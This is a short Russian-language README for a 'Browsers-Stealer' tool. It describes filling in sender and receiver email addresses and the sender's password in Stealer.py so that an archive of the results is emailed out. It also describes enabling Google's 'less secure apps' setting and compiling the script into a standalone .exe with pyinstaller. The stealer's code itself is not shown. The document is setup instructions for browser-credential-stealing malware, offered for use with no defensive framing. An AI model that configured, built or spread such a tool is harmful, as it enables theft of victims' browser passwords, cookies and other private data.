# Browsers-Stealer
## Настройка
Заполняем поля файла Stealer.py:
```
sender = "" - почта с которой будет отправляться архив с результатом
receiver = "" - почта на которю будет приходить архив
password = "" - пароль от почты "sender"
```

Переходим [сюда](https://myaccount.google.com/lesssecureapps), авторизовавшись с почты "sender" и разрешаем доступ
## Компиляция
Чтобы собрать все в .exe файл используем команду:
```
pyinstaller -F --hidden-import=pkg_resources.py2_warn Stealer.py
```
